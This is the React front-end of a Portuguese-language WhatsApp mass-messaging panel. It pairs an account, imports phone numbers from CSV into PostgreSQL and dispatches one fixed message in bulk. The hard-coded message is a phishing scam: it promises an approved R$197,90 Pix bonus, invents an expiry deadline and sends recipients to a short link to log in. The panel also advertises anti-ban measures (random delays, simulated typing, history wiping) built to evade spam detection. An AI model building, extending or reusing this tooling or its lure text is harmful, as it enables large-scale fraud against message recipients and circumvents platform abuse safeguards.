import React, { useState, useEffect } from "react";
import {
  MessageSquare,
  Send,
  Phone,
  ShieldCheck,
  History,
  Loader2,
  CheckCircle2,
  AlertCircle,
  Smartphone,
  Database,
  Upload,
  FileSpreadsheet,
  Eye,
  EyeOff,
  Copy,
  Check,
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

interface Status {
  status: "connecting" | "open" | "close" | "pairing";
  pairingCode: string | null;
  connectedAs?: string;
}

export default function App() {
  const [status, setStatus] = useState<Status>({ status: "close", pairingCode: null });
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [dispatching, setDispatching] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);

  // Configurações do banco de dados e contatos
  const [dbStatus, setDbStatus] = useState<{
    success: boolean;
    contacts: string[];
    error?: string;
    tableName?: string;
    columnName?: string;
    host?: string;
    database?: string;
  } | null>(null);
  const [loadingDB, setLoadingDB] = useState(false);

  // Novas states para credenciais do banco de dados e importador de CSV
  const [dbCredentials, setDbCredentials] = useState<any>(null);
  const [showPassword, setShowPassword] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [uploading, setUploading] = useState(false);
  const [uploadResult, setUploadResult] = useState<{
    success: boolean;
    count?: number;
    error?: string;
  } | null>(null);
  const [activeTab, setActiveTab] = useState<"import" | "credentials">("import");

  const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

  const fetchStatus = async () => {
    try {
      const res = await fetch("/api/status");
      const data = await res.json();
      setStatus(data);
    } catch (err: any) {
      if (err && (err.message === "Failed to fetch" || err.name === "TypeError")) {
        console.warn(
          "Erro ao buscar status (servidor reiniciando ou indisponível temporariamente):",
          err.message,
        );
      } else {
        console.error("Erro ao buscar status:", err);
      }
    }
  };

  const fetchCredentials = async () => {
    try {
      const res = await fetch("/api/db-credentials");
      const data = await res.json();
      setDbCredentials(data);
    } catch (err: any) {
      if (err && (err.message === "Failed to fetch" || err.name === "TypeError")) {
        console.warn(
          "Erro ao buscar credenciais do banco (servidor reiniciando ou indisponível temporariamente):",
          err.message,
        );
      } else {
        console.error("Erro ao buscar credenciais do banco:", err);
      }
    }
  };

  const fetchDBContacts = async () => {
    setLoadingDB(true);
    try {
      const res = await fetch("/api/contatos");
      const data = await res.json();
      setDbStatus(data);
    } catch (err: any) {
      if (err && (err.message === "Failed to fetch" || err.name === "TypeError")) {
        console.warn(
          "Erro ao buscar contatos do banco (servidor reiniciando ou indisponível temporariamente):",
          err.message,
        );
      } else {
        console.error("Erro ao buscar contatos do banco:", err);
      }
      setDbStatus({
        success: false,
        error: "Falha de conexão com o servidor local ao carregar contatos.",
        contacts: [],
      });
    } finally {
      setLoadingDB(false);
    }
  };

  const handleCopy = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handleCSVUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setUploading(true);
    setUploadResult(null);

    const reader = new FileReader();
    reader.onload = async (event) => {
      try {
        const text = event.target?.result as string;
        if (!text) {
          setUploadResult({ success: false, error: "O arquivo selecionado está vazio." });
          setUploading(false);
          return;
        }

        // Parse das linhas
        const lines = text.split(/\r?\n/);
        const phones: string[] = [];

        // Regex para localizar sequências numéricas que parecem com telefones (8 a 15 dígitos)
        const phoneRegex = /\d{8,15}/;

        for (const line of lines) {
          // Remove tudo que não for dígito
          const cleaned = line.replace(/\D/g, "");
          if (cleaned && cleaned.length >= 8 && cleaned.length <= 15) {
            phones.push(cleaned);
          } else {
            // Tenta extrair qualquer número válido na linha
            const match = line.match(phoneRegex);
            if (match) {
              phones.push(match[0]);
            }
          }
        }

        const uniquePhones = Array.from(new Set(phones));

        if (uniquePhones.length === 0) {
          setUploadResult({
            success: false,
            error:
              "Nenhum número de telefone válido encontrado. O arquivo deve conter números com DD e DDI (ex: 5511999999999).",
          });
          setUploading(false);
          return;
        }

        // Envia para a API de Importação em Lote
        const res = await fetch("/api/contatos/importar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ phones: uniquePhones }),
        });

        const data = await res.json();
        if (res.ok && data.success) {
          setUploadResult({ success: true, count: data.count });
          addLog(`[Importação] ${data.count} novos números salvos com sucesso no banco de dados.`);
          fetchDBContacts(); // Atualiza a contagem e visualização de contatos
        } else {
          setUploadResult({
            success: false,
            error: data.error || "Erro ao salvar números no banco de dados.",
          });
        }
      } catch (err: any) {
        console.error("Erro ao ler CSV:", err);
        setUploadResult({ success: false, error: err.message || "Erro de processamento." });
      } finally {
        setUploading(false);
        e.target.value = ""; // Limpa para permitir novo upload do mesmo arquivo
      }
    };
    reader.readAsText(file);
  };

  useEffect(() => {
    const interval = setInterval(fetchStatus, 3000);
    fetchDBContacts();
    fetchCredentials();
    return () => clearInterval(interval);
  }, []);

  const handleConnect = async () => {
    if (!phone) return;
    setLoading(true);
    try {
      const res = await fetch("/api/connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone }),
      });
      const data = await res.json();
      if (data.pairingCode) {
        setStatus((prev) => ({ ...prev, pairingCode: data.pairingCode, status: "pairing" }));
      }
    } catch (err) {
      console.error("Erro ao conectar:", err);
    } finally {
      setLoading(false);
    }
  };

  const handleDisconnect = async () => {
    if (!confirm("Tem certeza que deseja desconectar esta conta?")) return;
    try {
      await fetch("/api/disconnect", { method: "POST" });
      setStatus({ status: "close", pairingCode: null, connectedAs: undefined });
      addLog("[Sistema] Conta do WhatsApp desconectada com sucesso.");
    } catch (err) {
      console.error("Erro ao desconectar:", err);
    }
  };

  const handleDispatch = async () => {
    if (!dbStatus || !dbStatus.success || dbStatus.contacts.length === 0) {
      setLogs((prev) => [`[Aviso] Nenhum contato válido carregado do banco de dados.`, ...prev]);
      return;
    }
    setDispatching(true);
    const targetCount = dbStatus.contacts.length;
    setLogs((prev) => [
      `[Início] Enviando mensagens para os ${targetCount} contatos carregados do banco...`,
      ...prev,
    ]);

    try {
      const res = await fetch("/api/disparar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ targets: dbStatus.contacts }),
      });

      if (res.ok) {
        setLogs((prev) => [`[Sucesso] Disparos em massa iniciados em segundo plano!`, ...prev]);
      } else {
        const errData = await res.json();
        setLogs((prev) => [
          `[Erro] Falha ao disparar: ${errData.error || "Erro desconhecido"}`,
          ...prev,
        ]);
      }
    } catch (err) {
      setLogs((prev) => [`[Erro] Falha ao iniciar disparos no servidor.`, ...prev]);
    } finally {
      setDispatching(false);
    }
  };

  const addLog = (msg: string) => {
    setLogs((prev) => [msg, ...prev].slice(0, 50));
  };

  return (
    <div className="min-h-screen bg-neutral-950 text-neutral-100 font-sans p-4 md:p-8 selection:bg-emerald-500/30">
      <div className="max-w-4xl mx-auto space-y-8">
        {/* Header */}
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-neutral-800 pb-6">
          <div>
            <h1 className="text-3xl font-bold tracking-tight bg-gradient-to-r from-emerald-400 to-cyan-400 bg-clip-text text-transparent">
              WhatsApp Master API
            </h1>
            <p className="text-neutral-500 text-sm mt-1">
              Sistema Independente de Disparos Humanizados
            </p>
          </div>

          <div className="flex items-center gap-3 bg-neutral-900 px-4 py-2 rounded-full border border-neutral-800">
            <div
              className={`w-2 h-2 rounded-full ${status.status === "open" ? "bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]" : "bg-red-500"}`}
            />
            <span className="text-sm font-medium uppercase tracking-wider">
              {status.status === "open"
                ? "Conectado"
                : status.status === "pairing"
                  ? "Aguardando Pairing"
                  : "Desconectado"}
            </span>
          </div>
        </header>

        <div className="grid md:grid-cols-2 gap-8">
          {/* Connection Section */}
          <motion.section
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-neutral-900 border border-neutral-800 rounded-2xl p-6 shadow-xl"
          >
            <div className="flex items-center gap-3 mb-6">
              <div className="p-2 bg-emerald-500/10 rounded-lg">
                <Smartphone className="w-5 h-5 text-emerald-400" />
              </div>
              <h2 className="text-xl font-semibold">Conectar Dispositivo</h2>
            </div>

            {status.status !== "open" ? (
              <div className="space-y-4">
                <div>
                  <label className="text-xs font-mono text-neutral-500 uppercase">
                    Número do WhatsApp (DDI + DDD + Número)
                  </label>
                  <input
                    type="text"
                    placeholder="5511999999999"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    className="w-full bg-black border border-neutral-700 rounded-xl px-4 py-3 mt-1 focus:outline-none focus:border-emerald-500 transition-colors"
                  />
                </div>
                <button
                  onClick={handleConnect}
                  disabled={loading || !phone}
                  className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:bg-neutral-800 disabled:text-neutral-600 font-bold py-3 rounded-xl transition-all flex items-center justify-center gap-2"
                >
                  {loading ? (
                    <Loader2 className="w-5 h-5 animate-spin" />
                  ) : (
                    "Gerar Código de Pareamento"
                  )}
                </button>

                <AnimatePresence>
                  {status.pairingCode && (
                    <motion.div
                      initial={{ scale: 0.9, opacity: 0 }}
                      animate={{ scale: 1, opacity: 1 }}
                      className="mt-6 p-4 bg-emerald-500/5 border border-emerald-500/20 rounded-xl text-center"
                    >
                      <p className="text-sm text-neutral-400 mb-2 font-mono">
                        INSIRA ESTE CÓDIGO NO WHATSAPP:
                      </p>
                      <div className="text-4xl font-black tracking-[0.2em] text-emerald-400 font-mono py-2">
                        {status.pairingCode}
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            ) : (
              <div className="flex flex-col items-center justify-center py-8 space-y-4">
                <CheckCircle2 className="w-16 h-16 text-emerald-500" />
                <div className="text-center">
                  <p className="font-bold">Dispositivo Ativo</p>
                  <p className="text-neutral-500 text-sm">
                    ID: {status.connectedAs?.split(":")[0]}
                  </p>
                </div>
                <button
                  onClick={handleDisconnect}
                  className="mt-2 text-xs font-semibold text-red-400 hover:text-red-300 bg-red-500/10 hover:bg-red-500/20 px-4 py-2 rounded-xl transition-all cursor-pointer"
                >
                  Desconectar Conta
                </button>
              </div>
            )}
          </motion.section>

          {/* Gerenciador do Banco de Dados & Importador de CSV */}
          <section className="bg-neutral-900 border border-neutral-800 rounded-2xl p-6 shadow-xl flex flex-col justify-between space-y-6">
            <div className="space-y-4">
              <div className="flex items-center justify-between border-b border-neutral-800 pb-4">
                <div className="flex items-center gap-2">
                  <Database className="w-5 h-5 text-cyan-400" />
                  <h2 className="text-base font-semibold">Gerenciador de Números</h2>
                </div>
                <div className="flex bg-black/40 rounded-lg p-0.5 border border-neutral-800 text-[11px]">
                  <button
                    onClick={() => setActiveTab("import")}
                    className={`px-2.5 py-1 rounded-md font-medium cursor-pointer transition-all ${
                      activeTab === "import"
                        ? "bg-cyan-500/10 text-cyan-400 font-semibold"
                        : "text-neutral-500 hover:text-neutral-300"
                    }`}
                  >
                    Importar CSV
                  </button>
                  <button
                    onClick={() => setActiveTab("credentials")}
                    className={`px-2.5 py-1 rounded-md font-medium cursor-pointer transition-all ${
                      activeTab === "credentials"
                        ? "bg-cyan-500/10 text-cyan-400 font-semibold"
                        : "text-neutral-500 hover:text-neutral-300"
                    }`}
                  >
                    Acesso ao Banco
                  </button>
                </div>
              </div>

              {activeTab === "import" ? (
                <div className="space-y-4">
                  <p className="text-xs text-neutral-400 leading-relaxed">
                    Importe listas de contatos salvos no formato <b>CSV</b> ou <b>TXT</b>{" "}
                    diretamente no seu banco de dados PostgreSQL. O sistema removerá duplicados e
                    formatará automaticamente.
                  </p>

                  <div className="relative border-2 border-dashed border-neutral-800 hover:border-cyan-500/50 rounded-xl p-5 transition-colors text-center bg-black/20 group cursor-pointer">
                    <input
                      type="file"
                      accept=".csv,.txt"
                      onChange={handleCSVUpload}
                      id="csv-file-upload"
                      className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                      disabled={uploading}
                    />
                    <div className="flex flex-col items-center justify-center space-y-2">
                      {uploading ? (
                        <>
                          <Loader2 className="w-8 h-8 text-cyan-400 animate-spin" />
                          <p className="text-xs font-medium text-neutral-300">
                            Processando e inserindo contatos...
                          </p>
                        </>
                      ) : (
                        <>
                          <div className="p-2.5 bg-neutral-800/50 group-hover:bg-cyan-500/10 rounded-full transition-colors">
                            <FileSpreadsheet className="w-5 h-5 text-neutral-400 group-hover:text-cyan-400 transition-colors" />
                          </div>
                          <p className="text-xs font-medium text-neutral-300">
                            Arraste seu arquivo ou clique para selecionar
                          </p>
                          <p className="text-[10px] text-neutral-500">
                            Suporta arquivos .CSV ou .TXT com um número por linha
                          </p>
                        </>
                      )}
                    </div>
                  </div>

                  {uploadResult && (
                    <motion.div
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className={`p-3 rounded-xl border text-[11px] flex gap-3 ${
                        uploadResult.success
                          ? "bg-emerald-500/5 border-emerald-500/20 text-emerald-400"
                          : "bg-red-500/5 border-red-500/20 text-red-400"
                      }`}
                    >
                      <div className="mt-0.5">
                        {uploadResult.success ? (
                          <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                        ) : (
                          <AlertCircle className="w-4 h-4 text-red-400" />
                        )}
                      </div>
                      <div>
                        {uploadResult.success ? (
                          <>
                            <p className="font-bold">Sucesso no processamento!</p>
                            <p className="text-neutral-400 mt-0.5">
                              Foram salvos e validados <b>{uploadResult.count}</b> novos contatos
                              únicos no banco de dados.
                            </p>
                          </>
                        ) : (
                          <>
                            <p className="font-bold">Falha na importação</p>
                            <p className="text-neutral-400 mt-0.5">{uploadResult.error}</p>
                          </>
                        )}
                      </div>
                    </motion.div>
                  )}
                </div>
              ) : (
                <div className="space-y-3">
                  <p className="text-xs text-neutral-400 leading-relaxed">
                    Use estas credenciais para conectar programas externos (DBeaver, pgAdmin,
                    Python, Node, etc.) diretamente a este banco de dados e gerenciar os contatos
                    como preferir.
                  </p>

                  {dbCredentials ? (
                    <div className="bg-black/40 border border-neutral-800 rounded-xl p-3.5 space-y-2 font-mono text-[11px] text-neutral-300">
                      <div className="flex items-center justify-between border-b border-neutral-900 pb-1.5 mb-1.5">
                        <span className="text-[10px] font-semibold text-neutral-400">Motor:</span>
                        <span className="text-cyan-400 font-bold bg-cyan-500/5 border border-cyan-500/10 px-1.5 py-0.5 rounded text-[9px]">
                          PostgreSQL
                        </span>
                      </div>

                      {/* Host */}
                      <div className="space-y-1">
                        <div className="flex justify-between text-[10px] text-neutral-500">
                          <span>HOST / INSTÂNCIA:</span>
                          <button
                            onClick={() => handleCopy(dbCredentials.host, "host")}
                            className="text-cyan-500 hover:text-cyan-400 text-[10px] flex items-center gap-1 cursor-pointer"
                          >
                            {copiedField === "host" ? (
                              <Check className="w-2.5 h-2.5" />
                            ) : (
                              <Copy className="w-2.5 h-2.5" />
                            )}
                            {copiedField === "host" ? "Copiado" : "Copiar"}
                          </button>
                        </div>
                        <div className="bg-black/60 px-2.5 py-1 rounded border border-neutral-800 truncate text-neutral-200 text-[10px]">
                          {dbCredentials.host}
                        </div>
                      </div>

                      {/* Grid para Port, Database e User */}
                      <div className="grid grid-cols-2 gap-2">
                        <div className="space-y-1">
                          <span className="text-[10px] text-neutral-500">PORTA:</span>
                          <div className="bg-black/60 px-2.5 py-1 rounded border border-neutral-800 text-neutral-200 text-[10px]">
                            {dbCredentials.port}
                          </div>
                        </div>
                        <div className="space-y-1">
                          <span className="text-[10px] text-neutral-500">BANCO DE DADOS:</span>
                          <div className="bg-black/60 px-2.5 py-1 rounded border border-neutral-800 text-neutral-200 text-[10px] truncate">
                            {dbCredentials.database}
                          </div>
                        </div>
                      </div>

                      {/* User & Password */}
                      <div className="grid grid-cols-2 gap-2">
                        <div className="space-y-1">
                          <span className="text-[10px] text-neutral-500">USUÁRIO:</span>
                          <div className="bg-black/60 px-2.5 py-1 rounded border border-neutral-800 text-neutral-200 text-[10px] truncate">
                            {dbCredentials.user}
                          </div>
                        </div>
                        <div className="space-y-1">
                          <div className="flex justify-between text-[10px] text-neutral-500">
                            <span>SENHA:</span>
                            <button
                              onClick={() => setShowPassword(!showPassword)}
                              className="text-neutral-500 hover:text-neutral-400 cursor-pointer"
                            >
                              {showPassword ? (
                                <EyeOff className="w-2.5 h-2.5" />
                              ) : (
                                <Eye className="w-2.5 h-2.5" />
                              )}
                            </button>
                          </div>
                          <div className="bg-black/60 px-2.5 py-1 rounded border border-neutral-800 text-neutral-200 text-[10px] truncate flex items-center justify-between gap-1">
                            <span className="truncate">
                              {showPassword ? dbCredentials.password : "••••••••••••"}
                            </span>
                            <button
                              onClick={() => handleCopy(dbCredentials.password, "password")}
                              className="text-cyan-500 hover:text-cyan-400 cursor-pointer flex-shrink-0"
                            >
                              {copiedField === "password" ? (
                                <Check className="w-2.5 h-2.5" />
                              ) : (
                                <Copy className="w-2.5 h-2.5" />
                              )}
                            </button>
                          </div>
                        </div>
                      </div>

                      {/* Table / Column */}
                      <div className="grid grid-cols-2 gap-2 pt-1.5 border-t border-neutral-900 mt-1.5 text-[10px]">
                        <div>
                          <span className="text-neutral-500 uppercase">TABELA:</span>
                          <div className="text-neutral-400 font-semibold mt-0.5">
                            "{dbCredentials.tableName}"
                          </div>
                        </div>
                        <div>
                          <span className="text-neutral-500 uppercase">COLUNA:</span>
                          <div className="text-neutral-400 font-semibold mt-0.5">
                            "{dbCredentials.columnName}"
                          </div>
                        </div>
                      </div>

                      {dbCredentials.isCloudSQL && (
                        <div className="text-[9px] text-cyan-400/80 leading-relaxed border-t border-neutral-900 pt-1.5 font-sans">
                          💡 <b>Conexão Direta:</b> Este banco é totalmente gerenciado e roda
                          localmente integrado à sua aplicação.
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="bg-black/20 border border-neutral-800 rounded-xl p-6 flex flex-col items-center justify-center text-center space-y-2">
                      <Loader2 className="w-5 h-5 text-cyan-400 animate-spin" />
                      <p className="text-xs text-neutral-500">Carregando credenciais do banco...</p>
                    </div>
                  )}
                </div>
              )}
            </div>

            {/* Informações adicionais do sistema na base */}
            <div className="border-t border-neutral-800 pt-4 mt-auto">
              <div className="flex items-center gap-2 text-neutral-400 text-xs mb-1">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                <span className="font-medium text-neutral-300">Medidas Anti-Ban Ativas:</span>
              </div>
              <p className="text-[10px] text-neutral-500 leading-relaxed">
                Delay Randômico Humano (30-45s), Simulação de Digitação Realista (7-12s) e Limpeza
                de Histórico de Conversas ativa.
              </p>
            </div>
          </section>
        </div>

        {/* Dispatch Section */}
        <motion.section
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="bg-neutral-900 border border-neutral-800 rounded-2xl p-8 shadow-xl"
        >
          <div className="flex items-center justify-between mb-8">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-cyan-500/10 rounded-lg">
                <Send className="w-5 h-5 text-cyan-400" />
              </div>
              <h2 className="text-xl font-semibold">Esteira de Disparos em Massa</h2>
            </div>
          </div>

          <div className="grid md:grid-cols-2 gap-8">
            <div className="space-y-6">
              {/* Leitor do Banco de Dados */}
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-mono text-neutral-500 uppercase">
                    Leitor do Banco de Dados
                  </label>
                  <button
                    onClick={fetchDBContacts}
                    disabled={loadingDB}
                    className="text-xs text-cyan-400 hover:text-cyan-300 font-medium flex items-center gap-1 cursor-pointer transition-colors"
                  >
                    {loadingDB ? <Loader2 className="w-3 h-3 animate-spin" /> : "Recarregar Banco"}
                  </button>
                </div>

                {dbStatus ? (
                  dbStatus.success ? (
                    <div className="bg-emerald-500/5 border border-emerald-500/20 rounded-xl p-4 space-y-3">
                      <div className="flex items-center justify-between text-xs font-mono">
                        <span className="text-neutral-400">Status DB:</span>
                        <span className="text-emerald-400 font-semibold flex items-center gap-1">
                          Conectado ✅
                        </span>
                      </div>
                      {dbStatus.host && (
                        <div className="text-[11px] font-mono text-neutral-400 truncate">
                          <b>Host:</b> {dbStatus.host.split(".")[0]}.***
                        </div>
                      )}
                      {dbStatus.database && (
                        <div className="text-[11px] font-mono text-neutral-400">
                          <b>DB:</b> {dbStatus.database} | <b>Tabela:</b> {dbStatus.tableName} |{" "}
                          <b>Coluna:</b> {dbStatus.columnName}
                        </div>
                      )}
                      <div className="border-t border-emerald-500/10 pt-2 flex items-center justify-between">
                        <span className="text-xs font-semibold text-neutral-200">
                          Números Carregados:
                        </span>
                        <span className="text-lg font-black text-emerald-400">
                          {dbStatus.contacts.length}
                        </span>
                      </div>
                      {dbStatus.contacts.length > 0 && (
                        <div className="mt-2 text-[11px] font-mono bg-black/40 border border-neutral-800 rounded-lg p-2 max-h-24 overflow-y-auto space-y-1">
                          {dbStatus.contacts.slice(0, 20).map((phoneVal, idx) => (
                            <div key={idx} className="text-neutral-500 flex items-center gap-1.5">
                              <span className="text-emerald-500/40">•</span> {phoneVal}
                            </div>
                          ))}
                          {dbStatus.contacts.length > 20 && (
                            <div className="text-[10px] text-neutral-600 italic">
                              ...e mais {dbStatus.contacts.length - 20} contatos
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="bg-red-500/5 border border-red-500/20 rounded-xl p-4 space-y-3 text-xs">
                      <div className="font-semibold text-red-400 flex items-center gap-1.5">
                        <AlertCircle className="w-4 h-4" /> Sem Conexão com o Banco
                      </div>
                      <p className="text-neutral-400 leading-relaxed text-[11px]">
                        {dbStatus.error}
                      </p>
                      <div className="bg-black/30 p-3 rounded-lg border border-neutral-800 text-[10px] font-mono text-neutral-500 space-y-1">
                        <p className="font-semibold text-neutral-400">Como configurar seu banco:</p>
                        <p>
                          Insira as seguintes variáveis de ambiente na seção <b>Settings</b> no
                          painel lateral do AI Studio:
                        </p>
                        <div className="pl-2 space-y-0.5 text-neutral-400 mt-1">
                          <p>
                            • <b>DB_HOST</b>: endereço do seu PostgreSQL/Supabase
                          </p>
                          <p>
                            • <b>DB_PORT</b>: porta (padrão 5432)
                          </p>
                          <p>
                            • <b>DB_USER</b>: usuário
                          </p>
                          <p>
                            • <b>DB_PASSWORD</b>: senha
                          </p>
                          <p>
                            • <b>DB_NAME</b>: nome do banco de dados
                          </p>
                          <p>
                            • <b>DB_TABLE</b>: tabela (padrão: "contatos")
                          </p>
                          <p>
                            • <b>DB_COLUMN</b>: coluna dos números (padrão: "phone")
                          </p>
                        </div>
                      </div>
                    </div>
                  )
                ) : (
                  <div className="bg-neutral-950 border border-neutral-800 rounded-xl p-6 flex flex-col items-center justify-center text-center space-y-2">
                    <Loader2 className="w-6 h-6 text-cyan-400 animate-spin" />
                    <p className="text-xs text-neutral-400 font-mono">
                      Carregando dados do banco de dados...
                    </p>
                  </div>
                )}
              </div>

              {/* Modelo de Mensagem Fixo (Somente Leitura) */}
              <div>
                <label className="text-xs font-mono text-neutral-500 uppercase">
                  Mensagem Oficial Enviada (Modelo Imutável)
                </label>
                <div className="w-full bg-black/60 border border-neutral-800 rounded-xl px-4 py-3 mt-1 text-sm text-neutral-300 font-sans whitespace-pre-wrap leading-relaxed max-h-48 overflow-y-auto custom-scrollbar select-none">
                  {FIXED_MESSAGE}
                </div>
                <p className="text-[10px] text-cyan-500/80 font-mono mt-2">
                  💡 Esta mensagem é padronizada e imutável para garantir a segurança de todos os
                  envios.
                </p>
              </div>

              <button
                onClick={handleDispatch}
                disabled={
                  dispatching ||
                  status.status !== "open" ||
                  !dbStatus?.success ||
                  dbStatus.contacts.length === 0
                }
                className="w-full bg-cyan-600 hover:bg-cyan-500 disabled:bg-neutral-800 disabled:text-neutral-600 font-bold py-4 rounded-xl transition-all flex items-center justify-center gap-3 shadow-lg shadow-cyan-900/10 cursor-pointer"
              >
                <Send className="w-5 h-5" />
                Iniciar Esteira de Disparos
              </button>
            </div>

            {/* Logs do Servidor */}
            <div className="bg-black/50 border border-neutral-800 rounded-xl p-4 flex flex-col">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xs font-mono text-neutral-500 uppercase flex items-center gap-2">
                  <History className="w-3.5 h-3.5" /> Log do Servidor
                </h3>
                <button
                  className="text-[10px] text-neutral-600 hover:text-neutral-400 uppercase font-mono"
                  onClick={() => setLogs([])}
                >
                  Limpar
                </button>
              </div>
              <div className="flex-1 overflow-y-auto max-h-[380px] space-y-2 pr-2 custom-scrollbar">
                {logs.length === 0 ? (
                  <div className="text-neutral-700 text-xs font-mono italic">
                    Aguardando atividades...
                  </div>
                ) : (
                  logs.map((log, i) => (
                    <div
                      key={i}
                      className={`text-[11px] font-mono leading-relaxed border-l-2 pl-3 ${log.includes("Erro") ? "border-red-500 text-red-400" : "border-neutral-700 text-neutral-400"}`}
                    >
                      <span className="text-neutral-600 mr-2">
                        [{new Date().toLocaleTimeString()}]
                      </span>
                      {log}
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </motion.section>
      </div>

      <style>{`
                .custom-scrollbar::-webkit-scrollbar { width: 4px; }
                .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
                .custom-scrollbar::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
            `}</style>
    </div>
  );
}
